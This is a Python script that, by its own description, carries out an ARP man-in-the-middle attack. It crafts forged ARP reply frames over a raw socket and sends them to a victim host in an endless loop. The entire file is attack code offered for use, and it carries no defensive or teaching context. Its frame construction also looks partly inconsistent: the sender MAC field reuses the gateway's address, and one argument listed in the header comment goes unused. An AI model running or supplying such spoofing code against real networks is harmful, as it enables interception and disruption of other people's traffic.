#cl args : <victimmac> <gatewaymac> <victimip> <gatewayip> <1/2> interface

from socket import *;
from struct import *;
import argparse;
import time;

parser = argparse.ArgumentParser("this script is used to perform ARP man in the middle attack")
parser.add_argument("victimmac", type=str, help="the victims mac address (required positional argument)")
parser.add_argument("gatewaymac", type=str, help="gateways mac address (required positional argument)")
parser.add_argument("victimip", type=str, help="the victims ip address (required positional argument)")
parser.add_argument("gatewayip", type=str, help="gateways ip address (required positional argument)")
parser.add_argument("interface", type=str, help="the interface name")
# parser.add_argument("sleeptime", default=2, type=str, help="the time gap in seconds between two arp replys")

args = parser.parse_args()

s = socket(AF_PACKET, SOCK_RAW)
s.bind((args.interface, 0))
# st = int(args.sleeptime)
st = 2

# add the ethernet headers
v_mac = [int(i, base=16) for i in args.victimmac.split(':')]
gw_mac = [int(i, base=16) for i in args.gatewaymac.split(':')]

frame = pack('>6B', v_mac[0], v_mac[1], v_mac[2], v_mac[3], v_mac[4], v_mac[5])
frame += pack('>6B', gw_mac[0], gw_mac[1], gw_mac[2], gw_mac[3], gw_mac[4], gw_mac[5])

# add the frame type(ARP(0x0806))
frame += pack('>H', 0x0806)

# construct the arp header and body

# Hardware type: Ethernet(1)
# protocol type: IPv4(0x0800)
# hardware size: 6
# protocol size: 4
# Opcode: 2 (arp response)
frame += pack('>4H', 0x0001, 0x0800, 0x0604, 0x0002)

# source ip & target ip
s_ip = [int(i) for i in args.gatewayip.split('.')]
t_ip = [int(i) for i in args.victimip.split('.')]

frame += pack('>6B', gw_mac[0], gw_mac[1], gw_mac[2], gw_mac[3], gw_mac[4], gw_mac[5])
frame += pack('>4B', s_ip[0], s_ip[1], s_ip[2], s_ip[3])
frame += pack('>6B', v_mac[0], v_mac[1], v_mac[2], v_mac[3], v_mac[4], v_mac[5])
frame += pack('>4B', t_ip[0], t_ip[1], t_ip[2], t_ip[3])

while True:
    s.send(frame)
    time.sleep(st)

